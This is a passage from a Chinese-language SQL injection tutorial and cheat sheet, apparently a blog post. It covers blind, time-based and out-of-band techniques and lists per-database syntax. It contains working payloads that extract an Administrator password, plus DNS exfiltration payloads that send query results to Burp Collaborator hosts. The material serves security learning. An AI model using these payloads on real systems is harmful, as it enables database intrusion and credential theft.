    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">all_tables</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">all_tab_columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;USERS&#39;</span></span></span></code></pre></div></div>
<h3 id="盲注">盲注</h3>
<p>当存在SQL注入但是不存在回显的时候就需要用到盲注。</p>
<h4 id="布尔盲注-有回显">布尔盲注-有回显</h4>
<p>假设一个网站使用tracking cookies来收集关于使用情况的分析，cookie可能是这样：</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</span></span></code></pre></div></div>
<p>当处理包含<code>TrackingId</code>的cookie的请求时，服务器使用如下的SQL语句确定该用户的身份</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">TrackingId</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">TrackedUsers</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">TrackingId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;u5YD3PapBcR4lN3e7Tj4&#39;</span></span></span></code></pre></div></div>
<p>这样的查询就存在SQL注入，但是查询的结果不会返回。但是对于不同的数据，网站的行为可能有所不同，假设提交的ID被是被成功，网页会显示一条欢迎回来之类的信息，这样的行为足矣。</p>
<p>假设注入下述语句：</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="err">…</span><span class="n">xyz</span><span class="s1">&#39; AND &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">…</span><span class="n">xyz</span><span class="s1">&#39; AND &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">2</span></span></span></code></pre></div></div>
<p>第一个值将返回结果，因为注入的<code>'1'='1</code>是正确的，因此会显示欢迎回来，所以第二行不会显示欢迎回来。这就允许攻击者确定任何表达是否正确。</p>
<p>假设有一个名为<code>Users</code>的表，列是<code>username</code>和<code>password</code>，并且诶存在一个名为<code>Administrator</code>的用户。攻击者可以通过一系列的paylaod确定此用户的密码。</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">xyz</span><span class="s1">&#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#39;</span><span class="n">Administrator</span><span class="s1">&#39;), 1, 1) &gt; &#39;</span><span class="n">m</span></span></span></code></pre></div></div>
<p><code>SUBSTRING</code>函数在一些数据库中叫做<code>SUBSTR</code>。</p>
<p>如果这样的输入会显示欢迎回来，说明密码的第一个字符是大于m。</p>
<p>如果不显示欢迎回来这样的信息的话，返回数据库报错信息也是可以的。</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">xyz</span><span class="s1">&#39; AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE &#39;</span><span class="n">a</span><span class="s1">&#39; END)=&#39;</span><span class="n">a</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">xyz</span><span class="s1">&#39; AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE &#39;</span><span class="n">a</span><span class="s1">&#39; END)=&#39;</span><span class="n">a</span></span></span></code></pre></div></div>
<p>这俩payload使用<code>CASE</code>关键字来测试条件，根据表达式是否成立从而返回不同的表达式。第一个payload，CASE表达式应当返回<code>'a'</code>，这没有错。第二个payload中，将会计算<code>1/0</code>，这就会导致一个错误。如果是否出错会让有些地方产生差异，攻击者可以根据差异来判断。</p>
<p>使用<code>CASE</code>关键字，上面那个<code>SUBSTRING</code>的payload还可以这样写</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">xyz</span><span class="s1">&#39; AND (SELECT CASE WHEN (Username = &#39;</span><span class="n">Administrator</span><span class="s1">&#39; AND SUBSTRING(Password, 1, 1) &gt; &#39;</span><span class="n">m</span><span class="s1">&#39;) THEN 1/0 ELSE &#39;</span><span class="n">a</span><span class="s1">&#39; END FROM Users)=&#39;</span><span class="n">a</span></span></span></code></pre></div></div>
<h4 id="时间盲注">时间盲注</h4>
<p>在不回显的时候，通常会使用时间盲注。通过条件是否成立来影响HTTP请求的响应时间。</p>
<p>这个方法因使用的数据库类型的不同而不同。在Microsoft SQL Server中，下面的payload可以用来实现时间盲注</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;; IF (1=2) WAITFOR DELAY &#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">10</span><span class="s1">&#39;--</span></span></span></code></pre></div></div>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;; IF (1=1) WAITFOR DELAY &#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">10</span><span class="s1">&#39;--</span></span></span></code></pre></div></div>
<p>第一个payload不会触发延迟，第二个则会触发延迟。</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;; IF (SELECT COUNT(Username) FROM Users WHERE Username = &#39;</span><span class="n">Administrator</span><span class="s1">&#39; AND SUBSTRING(Password, 1, 1) &gt; &#39;</span><span class="n">m</span><span class="s1">&#39;) = 1 WAITFOR DELAY &#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="err">{</span><span class="n">delay</span><span class="err">}</span><span class="s1">&#39;--</span></span></span></code></pre></div></div>
<h4 id="带外-oast">带外 (OAST)</h4>
<p>加入网站执行SQL查询是异步执行的。网站在原本的线程处理用户的请求，另一个线程使用tracking cookie来执行SQL查询。因为网站的响应不会回显，也不会因查询而花费时间，所以上述方法都失效。</p>
<p>此时通常利用盲注去使服务器与out-of-band (OAST)网络进行交互。</p>
<p>可以使用多种网络协议实现这一点，通常最有效的是DNS服务，很多网站允许DNS的自由进出，它对它们的正常运行至关重要。</p>
<p>触发DNS查询的方法因数据库类型的不同而不同。在Microsoft SQL Server上，下面的payload用于在指定域名进行DNS查询</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;; exec master..xp_dirtree &#39;</span><span class="o">//</span><span class="mi">0</span><span class="n">efdymgw1o5w9inae8mg4dfrgim9ay</span><span class="p">.</span><span class="n">burpcollaborator</span><span class="p">.</span><span class="n">net</span><span class="o">/</span><span class="n">a</span><span class="s1">&#39;--</span></span></span></code></pre></div></div>
<p>确定来触发带外交互的方法后，可以开始拿数据了</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username=&#39;</span><span class="n">Administrator</span><span class="s1">&#39;);exec(&#39;</span><span class="n">master</span><span class="p">..</span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s2">&#34;//&#39;+@p+&#39;.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a&#34;</span><span class="s1">&#39;)--</span></span></span></code></pre></div></div>
<p>因为带外成功的可能性很大并且能直接拿数据，所以其在盲注中是一个非常强大的方法。即使其他盲注也可是可行的，带外也可以是一个优先考虑的选项。</p>
<h3 id="除了select的sql注入">除了SELECT的SQL注入</h3>
<p>大多数SQL注入漏洞出现在<code>SELECT</code>查询的<code>WHERE</code>子句中。理论上，SQL注入漏洞不仅出现在<code>SELECT</code>语句中。出现SQL注入漏洞的常见的其他位置分别是</p>
<ul>
<li><code>UPDATE</code>，在更新的值或者<code>WHERE</code>子句中</li>
<li><code>INSERT</code>，在插入的值中</li>
<li><code>SELECT</code>，在表或列的名称中</li>
<li><code>SELECT</code>，在<code>ORDER BY</code>子句中</li>
</ul>
<h3 id="不同上下文的sql注入">不同上下文的SQL注入</h3>
<p>攻击者可以使用任何会被网站带入SQL语句处理的可控输入来进行SQL注入攻击。例如一些网站会接收JSON或XML格式的输入并使用它来查带入SQL语句。</p>
<p>不同的格式甚至可以提供混淆payload的方法来绕过网站的防御机制。</p>
<h3 id="二次注入">二次注入</h3>
<p>二次注入，这通常通过将输入放入数据库中完成。存储到数据库的时候不会出现问题，在网站处理请求检查存储的数据，将其以不安全的方式合并到SQL语句中就出了问题。</p>
<p>二次注入通常因为网站开发者会信任放入数据库的数据而导致的。</p>
<h2 id="漏洞检测">漏洞检测</h2>
<ul>
<li>添加<code>'</code>之类的字符查找错误或其他异常</li>
<li>添加一些特定的用来计算潜在注入点原本的值和另一个值的SQL语句</li>
<li>添加一些布尔表达式，寻找响应之间的差异</li>
<li>添加时间盲注的payload</li>
<li>添加带外的payload</li>
</ul>
<h2 id="数据库间语句的差异">数据库间语句的差异</h2>
<h3 id="连接字符串">连接字符串</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: center">数据库类型</th>
          <th style="text-align: center">语句</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: center">Oracle</td>
          <td style="text-align: center">&lsquo;foo&rsquo;||&lsquo;bar&rsquo;</td>
      </tr>
      <tr>
          <td style="text-align: center">Microsoft</td>
          <td style="text-align: center">&lsquo;foo&rsquo;+&lsquo;bar&rsquo;</td>
      </tr>
      <tr>
          <td style="text-align: center">PostgreSQL</td>
          <td style="text-align: center">&lsquo;foo&rsquo;||&lsquo;bar&rsquo;</td>
      </tr>
      <tr>
          <td style="text-align: center">MySQL</td>
          <td style="text-align: center">&lsquo;foo&rsquo; &lsquo;bar&rsquo;</td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: center">CONCAT(&lsquo;foo&rsquo;,&lsquo;bar&rsquo;)</td>
      </tr>
  </tbody>
</table>
<p>MYSQL有两种方式，注意第一种方式中两个字符串之间的空格</p>
<h3 id="截取字符串">截取字符串</h3>
<p>偏移量索引从1开始。</p>
<table>
  <thead>
      <tr>
          <th style="text-align: center">数据库类型</th>
          <th style="text-align: center">语句</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: center">Oracle</td>
          <td style="text-align: center">SUBSTR(&lsquo;foobar&rsquo;, 4, 2)</td>
      </tr>
      <tr>
          <td style="text-align: center">Microsoft</td>
          <td style="text-align: center">SUBSTRING(&lsquo;foobar&rsquo;, 4, 2)</td>
      </tr>
      <tr>
          <td style="text-align: center">PostgreSQL</td>
          <td style="text-align: center">SUBSTRING(&lsquo;foobar&rsquo;, 4, 2)</td>
      </tr>
      <tr>
          <td style="text-align: center">MySQL</td>
          <td style="text-align: center">SUBSTRING(&lsquo;foobar&rsquo;, 4, 2)</td>
      </tr>
  </tbody>
</table>
<h3 id="注释符">注释符</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: center">数据库类型</th>
          <th style="text-align: center">语句</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: center">Oracle</td>
          <td style="text-align: center">&ndash;comment</td>
      </tr>
      <tr>
          <td style="text-align: center">Microsoft</td>
          <td style="text-align: center">&ndash;comment</td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: center">/*comment*/</td>
      </tr>
      <tr>
          <td style="text-align: center">PostgreSQL</td>
          <td style="text-align: center">&ndash;comment</td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: center">/*comment*/</td>
      </tr>
      <tr>
          <td style="text-align: center">MySQL</td>
          <td style="text-align: center">#comment</td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: center">&ndash; comment</td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: center">/*comment*/</td>
      </tr>
  </tbody>
</table>
<p>注意MYSQL的第二种方式<code>--</code>后面有一个空格，URL使用这种注释符的话要对其进行URL编码，用<code>+</code>来表示<code> </code>。</p>
<h3 id="查询数据库版本">查询数据库版本</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: center">数据库类型</th>
          <th style="text-align: center">语句</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: center">Oracle</td>
          <td style="text-align: center">SELECT banner FROM v$version</td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: center">SELECT version FROM v$instance</td>
      </tr>
      <tr>
          <td style="text-align: center">Microsoft</td>
          <td style="text-align: center">SELECT @@version</td>
      </tr>
      <tr>
          <td style="text-align: center">PostgreSQL</td>
          <td style="text-align: center">SELECT version()</td>
      </tr>
      <tr>
          <td style="text-align: center">MySQL</td>
          <td style="text-align: center">SELECT @@version</td>
      </tr>
  </tbody>
</table>
<h3 id="查询数据库的表和列">查询数据库的表和列</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: center">数据库类型</th>
          <th style="text-align: left">语句</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: center">Oracle</td>
          <td style="text-align: left">SELECT * FROM all_tables</td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: left">SELECT * FROM all_tab_columns WHERE table_name = &lsquo;TABLE-NAME-HERE&rsquo;</td>
      </tr>
      <tr>
          <td style="text-align: center">Microsoft</td>
          <td style="text-align: left">SELECT * FROM information_schema.tables</td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: left">SELECT * FROM information_schema.columns WHERE table_name = &lsquo;TABLE-NAME-HERE&rsquo;</td>
      </tr>
      <tr>
          <td style="text-align: center">PostgreSQL</td>
          <td style="text-align: left">SELECT * FROM information_schema.tables</td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: left">SELECT * FROM information_schema.columns WHERE table_name = &lsquo;TABLE-NAME-HERE&rsquo;</td>
      </tr>
      <tr>
          <td style="text-align: center">MySQL</td>
          <td style="text-align: left">SELECT * FROM information_schema.tables</td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: left">SELECT * FROM information_schema.columns WHERE table_name = &lsquo;TABLE-NAME-HERE&rsquo;</td>
      </tr>
  </tbody>
</table>
<h3 id="判断条件的报错">判断条件的报错</h3>
<p>（标题原本是Conditional errors，直译的话是个什么东西啊，所以瞎起来一个名字）</p>
<table>
  <thead>
      <tr>
          <th style="text-align: center">数据库类型</th>
          <th style="text-align: left">语句</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: center">Oracle</td>
          <td style="text-align: left">SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</td>
      </tr>
      <tr>
          <td style="text-align: center">Microsoft</td>
          <td style="text-align: left">SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</td>
      </tr>
      <tr>
          <td style="text-align: center">PostgreSQL</td>
          <td style="text-align: left">1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST(1/0 AS INTEGER) ELSE NULL END)</td>
      </tr>
      <tr>
          <td style="text-align: center">MySQL</td>
          <td style="text-align: left">SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&lsquo;a&rsquo;)</td>
      </tr>
  </tbody>
</table>
<h3 id="堆叠注入">堆叠注入</h3>
<p>可以将多个语句连接起来。后面的语句不会有回显，所以多用于盲注。</p>
<table>
  <thead>
      <tr>
          <th style="text-align: center">数据库类型</th>
          <th style="text-align: center">语句</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: center">Oracle</td>
          <td style="text-align: center">Does not support batched queries.</td>
      </tr>
      <tr>
          <td style="text-align: center">Microsoft</td>
          <td style="text-align: center">QUERY-1-HERE; QUERY-2-HERE</td>
      </tr>
      <tr>
          <td style="text-align: center">PostgreSQL</td>
          <td style="text-align: center">QUERY-1-HERE; QUERY-2-HERE</td>
      </tr>
      <tr>
          <td style="text-align: center">MySQL</td>
          <td style="text-align: center">QUERY-1-HERE; QUERY-2-HERE</td>
      </tr>
  </tbody>
</table>
<h3 id="时间延迟">时间延迟</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: center">数据库类型</th>
          <th style="text-align: center">语句</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: center">Oracle</td>
          <td style="text-align: center">dbms_pipe.receive_message((&lsquo;a&rsquo;),10)</td>
      </tr>
      <tr>
          <td style="text-align: center">Microsoft</td>
          <td style="text-align: center">WAITFOR DELAY &lsquo;0:0:10&rsquo;</td>
      </tr>
      <tr>
          <td style="text-align: center">PostgreSQL</td>
          <td style="text-align: center">SELECT pg_sleep(10)</td>
      </tr>
      <tr>
          <td style="text-align: center">MySQL</td>
          <td style="text-align: center">SELECT SLEEP(10)</td>
      </tr>
  </tbody>
</table>
<h3 id="dns查询">DNS查询</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: center">数据库类型</th>
          <th style="text-align: left">语句</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: center">Oracle</td>
          <td style="text-align: left">该例子利用XXE触发，漏洞已被修复，但有的网站用的Orcale没修复：</td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: left">SELECT EXTRACTVALUE(xmltype(&rsquo;&lt;?xml version=&ldquo;1.0&rdquo; encoding=&ldquo;UTF-8&rdquo;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &ldquo;http://BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&rsquo;),&rsquo;/l&rsquo;) FROM dual</td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: left">以下用于打了补丁后的，但需要高权限:</td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: left">SELECT UTL_INADDR.get_host_address(&lsquo;BURP-COLLABORATOR-SUBDOMAIN&rsquo;)</td>
      </tr>
      <tr>
          <td style="text-align: center">Microsoft</td>
          <td style="text-align: left">exec master..xp_dirtree &lsquo;//BURP-COLLABORATOR-SUBDOMAIN/a&rsquo;</td>
      </tr>
      <tr>
          <td style="text-align: center">PostgreSQL</td>
          <td style="text-align: left">copy (SELECT &lsquo;&rsquo;) to program &rsquo;nslookup BURP-COLLABORATOR-SUBDOMAIN&rsquo;</td>
      </tr>
      <tr>
          <td style="text-align: center">MySQL</td>
          <td style="text-align: left">下面例子只适用于Windows:</td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: left">LOAD_FILE(&rsquo;\\BURP-COLLABORATOR-SUBDOMAIN\a&rsquo;)</td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: left">SELECT &hellip; INTO OUTFILE &lsquo;\\BURP-COLLABORATOR-SUBDOMAIN\a&rsquo;</td>
      </tr>
  </tbody>
</table>
<h3 id="带有数据过滤的dns查询">带有数据过滤的DNS查询</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: center">数据库类型</th>
          <th style="text-align: left">语句</th>
          <th></th>
          <th></th>
          <th></th>
          <th></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: center">Oracle</td>
          <td style="text-align: left">SELECT EXTRACTVALUE(xmltype(&rsquo;&lt;?xml version=&ldquo;1.0&rdquo; encoding=&ldquo;UTF-8&rdquo;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &ldquo;http://&rsquo;||(SELECT YOUR-QUERY-HERE)||&rsquo;.BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&rsquo;),&rsquo;/l&rsquo;) FROM dual</td>
          <td></td>
          <td></td>
          <td></td>
          <td></td>
      </tr>
      <tr>
          <td style="text-align: center">Microsoft</td>
          <td style="text-align: left">declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(&lsquo;master..xp_dirtree &ldquo;//&rsquo;+@p+&rsquo;.BURP-COLLABORATOR-SUBDOMAIN/a&rdquo;&rsquo;)</td>
          <td></td>
          <td></td>
          <td></td>
          <td></td>
      </tr>
      <tr>
          <td style="text-align: center">PostgreSQL</td>
          <td style="text-align: left">create OR replace function f() returns void as $$</td>
          <td></td>
          <td></td>
          <td></td>
          <td></td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: left">declare c text;</td>
          <td></td>
          <td></td>
          <td></td>
          <td></td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: left">declare p text;</td>
          <td></td>
          <td></td>
          <td></td>
          <td></td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: left">begin</td>
          <td></td>
          <td></td>
          <td></td>
          <td></td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: left">SELECT into p (SELECT YOUR-QUERY-HERE);</td>
          <td></td>
          <td></td>
          <td></td>
          <td></td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: left">c := &lsquo;copy (SELECT &lsquo;&rsquo;&rsquo;&rsquo;) to program &lsquo;&rsquo;nslookup '</td>
          <td></td>
          <td>p</td>
          <td></td>
          <td>&lsquo;.BURP-COLLABORATOR-SUBDOMAIN&rsquo;&rsquo;&rsquo;;</td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: left">execute c;</td>
          <td></td>
          <td></td>
          <td></td>
          <td></td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: left">END;</td>
          <td></td>
          <td></td>
          <td></td>
          <td></td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: left">$$ language plpgsql security definer;</td>
          <td></td>
          <td></td>
          <td></td>
          <td></td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: left">SELECT f();</td>
          <td></td>
          <td></td>
          <td></td>
          <td></td>
      </tr>
      <tr>
          <td style="text-align: center">MySQL</td>
          <td style="text-align: left">以下只适用于Windows:</td>
          <td></td>
          <td></td>
          <td></td>
          <td></td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: left">LOAD_FILE(&rsquo;\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&rsquo;)</td>
          <td></td>
          <td></td>
          <td></td>
          <td></td>
      </tr>
      <tr>
          <td style="text-align: center"></td>
          <td style="text-align: left">SELECT YOUR-QUERY-HERE INTO OUTFILE &lsquo;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&rsquo;</td>
          <td></td>
          <td></td>
          <td></td>
          <td></td>
      </tr>
  </tbody>
</table>]]></description>
</item>
</channel>
</rss>
